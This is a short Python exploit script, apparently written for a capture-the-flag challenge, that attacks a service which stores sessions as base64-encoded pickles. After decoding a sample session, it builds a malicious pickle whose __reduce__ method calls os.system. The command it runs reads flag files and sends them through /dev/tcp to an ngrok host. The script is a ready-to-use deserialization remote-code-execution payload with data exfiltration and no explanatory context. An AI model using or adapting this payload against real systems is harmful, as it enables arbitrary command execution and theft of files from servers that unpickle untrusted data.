#!/usr/bin/env python
​
import base64
import pickle
​
enc_sess = 'gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu'
​
serialized_sess = base64.b64decode(enc_sess)
print('SERIALIZED SESSION:', serialized_sess)
​
sess = pickle.loads(serialized_sess)
print('DESERIALIZED SESSION:', sess)
​
COMMAND = 'bash -c "cat fl* /home/*/fl* > /dev/tcp/0.tcp.ngrok.io/19060"'
​
class PickleExec:
    def __reduce__(self):
        import os
        return (os.system, (COMMAND,))
​
​
payload = base64.b64encode(pickle.dumps(PickleExec()))
print('PAYLOAD:', payload)
​
